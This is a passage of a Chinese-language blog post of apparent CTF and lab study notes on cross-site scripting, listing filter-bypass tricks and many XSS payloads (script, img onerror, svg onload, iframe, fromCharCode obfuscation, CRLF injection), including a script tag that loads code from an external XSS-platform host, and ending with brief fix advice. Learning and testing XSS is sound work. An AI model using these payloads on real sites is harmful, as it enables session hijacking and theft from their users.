<h4 id="符号绕过url限制"><a href="#符号绕过url限制" class="headerlink" title="@符号绕过url限制"></a>@符号绕过url限制</h4><p>例如：https:// <a href="mailto:www.segmentfault.com@xss.haozi.me">www.segmentfault.com@xss.haozi.me</a>/j.js</p>
<p>其实访问的是@后面的内容</p>
<h4 id="“-逃逸函数后接分号"><a href="#“-逃逸函数后接分号" class="headerlink" title="“)逃逸函数后接分号"></a>“)逃逸函数后接分号</h4><p>例：”);alert(1)//</p>
<h4 id="绕过转义限制"><a href="#绕过转义限制" class="headerlink" title="\绕过转义限制"></a>\绕过转义限制</h4><p>例：</p>
<p>&quot;)</p>
<p>alert(1) //</p>
<p>xss paylaod形式</p>
<script>alert(1)</script>

<script src=" http://xsspt.com/vA4t1W?1542101296"></script>

<p>&lt;img src=x οnerrοr=alert(1)&gt;</p>
<p><a href="javascript:alert(1)">xss</a></p>
<p>&lt;svg οnlοad=alert(1)&gt;</p>
<p>&lt;input type=”text” name=”test” οnclick=alert(1)&gt;</p>
<iframe src="javascript:alert(/xss/)">xss</iframe>

<iframe srcdoc="<script>alert&#40;1&#41;</script>">

<h4 id="绕过magic-quotes-gpc"><a href="#绕过magic-quotes-gpc" class="headerlink" title="绕过magic_quotes_gpc"></a>绕过magic_quotes_gpc</h4><script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)</script>

<h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><p>闭合标签</p>
<p>“&gt;<script>alert(/123/)</script></p>
<p></script><script>alert(1)</script></p>
<p>标签绕过</p>
<p>&lt;img src=”x” οnerrοr=”alert(1)”&gt;</p>
<p>&lt;button οnclick=”javascript:alert(‘xss’)&gt;XSS&lt;/button”&gt;</p>
<title><img a="</title><img/src=1 οnerrοr=alert(1)//">

<p>“οnsubmit=javascript:alert(1)%20name=”a</p>
<details open οntοggle="eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))">

<p>&lt;video src=” <a target="_blank" rel="noopener" href="http://www.0dutv.com/plug/down/up2.php/104678898.mp3&quot;">http://www.0dutv.com/plug/down/up2.php/104678898.mp3&quot;</a> οnprοgress=(′body′).prepend(123);</p>
<p>(‘body’)&gt;</video></p>
<h4 id="其他符号绕过"><a href="#其他符号绕过" class="headerlink" title="其他符号绕过"></a>其他符号绕过</h4><p>%0a     替换空格</p>
<p>%0d     替换空格</p>
<p>/**/     替换空格</p>
<p>%00     截断</p>
<p>``        替换括号</p>
<h4 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h4><p>gbxxxx系列的编码，那么我们尝试一下宽字节 %c0，%bf，%5c，%df</p>
<h4 id="其他事件绕过"><a href="#其他事件绕过" class="headerlink" title="其他事件绕过"></a>其他事件绕过</h4><blockquote>
<p>onload</p>
<p>onclick</p>
<p>onerror</p>
<p>prompt</p>
<p>confirm</p>
<p>onmousemove</p>
</blockquote>
<h4 id="CRLF-injection绕过"><a href="#CRLF-injection绕过" class="headerlink" title="CRLF injection绕过"></a>CRLF injection绕过</h4><p>CRLF是”回车 + 换行”（\r\n）的简称。</p>
<p><a href="http://www.xxx.com%0d%0a%0d%0a">http://www.xxx.com%0d%0a%0d%0a</a>&lt;svg/οnlοad=prompt(1)&gt;</p>
<h2 id="0xff-XSS漏洞修复方法"><a href="#0xff-XSS漏洞修复方法" class="headerlink" title="0xff:XSS漏洞修复方法"></a>0xff:XSS漏洞修复方法</h2><p>XSS漏洞涉及输入输出两个部分，是代码注入的一种，修复方法：（1）过滤输入的数据，例如一些非法字符“’”、“””、“&lt;”、”&gt;”、“on+”</p>
<p>（2）对输出到页面的数据进行相应的编码转换，HTML编码、JS编码、URL编码等。</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/03/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="反序列化">
      <i class="fa fa-chevron-left"></i> 反序列化
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/04/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="next" title="">
       <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#xss-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="nav-number">1.</span> <span class="nav-text">xss(跨站脚本攻击)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%89%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%EF%BC%8C%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E5%92%8Cdom%E5%9E%8Bxss"><span class="nav-number">1.0.1.</span> <span class="nav-text">有反射型xss，存储型xss和dom型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">反射型xss</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">存储型xss</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dom%E5%9E%8Bxss"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">dom型xss</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B5%8B%E8%AF%95%E6%89%8B%E6%B3%95"><span class="nav-number">1.0.1.4.</span> <span class="nav-text">常见的测试手法</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">做题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xss-lab"><span class="nav-number">2.1.</span> <span class="nav-text">&#x3D;&#x3D;xss -lab&#x3D;&#x3D;</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#level3-htmlspecialchars%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E5%9C%A8input%E6%88%96%E8%80%85JavaScript"><span class="nav-number">2.1.1.</span> <span class="nav-text">level3       htmlspecialchars绕过  一般在input或者JavaScript</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lever4"><span class="nav-number">2.1.2.</span> <span class="nav-text">lever4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level5-%E8%BF%87%E6%BB%A4%E4%BA%86on"><span class="nav-number">2.1.3.</span> <span class="nav-text">level5  过滤了on</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level6-%E6%AF%94%E4%BA%94%E5%A4%9A%E8%BF%87%E6%BB%A4%E4%BA%86href"><span class="nav-number">2.1.4.</span> <span class="nav-text">level6  比五多过滤了href</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level7-%E5%AD%A6%E4%B9%A0%E5%B5%8C%E5%A5%97%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%B9%E6%B3%95-%E9%80%82%E7%94%A8%E4%BA%8E%E6%9B%BF%E6%8D%A2%E6%88%90%E7%A9%BA%E6%A0%BC"><span class="nav-number">2.1.5.</span> <span class="nav-text">level7           学习嵌套注入的方法(适用于替换成空格)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#level8-%E5%AD%A6%E4%B9%A0%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.6.</span> <span class="nav-text">level8 学习实体编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9"><span class="nav-number">2.1.7.</span> <span class="nav-text">9</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctfshow"><span class="nav-number">2.2.</span> <span class="nav-text">&#x3D;&#x3D;ctfshow&#x3D;&#x3D;</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#316-%E5%88%A9%E7%94%A8alert%E5%BC%B9%E5%87%BA%E7%AE%A1%E7%90%86%E5%91%98%E7%9A%84cookie"><span class="nav-number">2.2.1.</span> <span class="nav-text">316 利用alert弹出管理员的cookie</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#317%E3%80%81318%E3%80%81319"><span class="nav-number">2.2.2.</span> <span class="nav-text">317、318、319</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%92%E5%85%A5"><span class="nav-number">2.2.2.0.1.</span> <span class="nav-text">常用的插入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#320-321-322-327-%E8%BF%87%E6%BB%A4%E4%BA%86xss%E5%AE%8C%E5%85%A8%E6%B2%A1%E5%BD%B1%E5%93%8D"><span class="nav-number">2.2.3.</span> <span class="nav-text">320 321 322-327(过滤了xss完全没影响)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#328-%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="nav-number">2.2.4.</span> <span class="nav-text">328 存储型xss</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#329"><span class="nav-number">2.2.5.</span> <span class="nav-text">329</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#330-%E6%AF%94%E4%B9%8B%E5%89%8D%E5%A4%9A%E4%BA%86%E4%B8%AA%E4%BF%AE%E6%94%B9%E6%A8%A1%E5%9D%97"><span class="nav-number">2.2.6.</span> <span class="nav-text">330 比之前多了个修改模块</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">2.3.</span> <span class="nav-text">xss绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.1.</span> <span class="nav-text">大小写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.2.</span> <span class="nav-text">双写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.3.</span> <span class="nav-text">替换绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#00%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.4.</span> <span class="nav-text">%00截断绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.5.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fromCharCode%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.6.</span> <span class="nav-text">fromCharCode方法绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#javascript%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.7.</span> <span class="nav-text">javascript伪协议绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">2.3.8.</span> <span class="nav-text">换行绕过正则匹配</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="nav-number">2.3.9.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%97%AD%E5%90%88%E6%A0%87%E7%AD%BE%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.10.</span> <span class="nav-text">闭合标签空格绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87url%E9%99%90%E5%88%B6"><span class="nav-number">2.3.11.</span> <span class="nav-text">@符号绕过url限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%9C-%E9%80%83%E9%80%B8%E5%87%BD%E6%95%B0%E5%90%8E%E6%8E%A5%E5%88%86%E5%8F%B7"><span class="nav-number">2.3.12.</span> <span class="nav-text">“)逃逸函数后接分号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E8%BD%AC%E4%B9%89%E9%99%90%E5%88%B6"><span class="nav-number">2.3.13.</span> <span class="nav-text">\绕过转义限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87magic-quotes-gpc"><span class="nav-number">2.3.14.</span> <span class="nav-text">绕过magic_quotes_gpc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%87%E7%AD%BE"><span class="nav-number">2.3.15.</span> <span class="nav-text">标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.16.</span> <span class="nav-text">其他符号绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.17.</span> <span class="nav-text">宽字节绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E4%BA%8B%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.18.</span> <span class="nav-text">其他事件绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CRLF-injection%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.19.</span> <span class="nav-text">CRLF injection绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xff-XSS%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">0xff:XSS漏洞修复方法</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
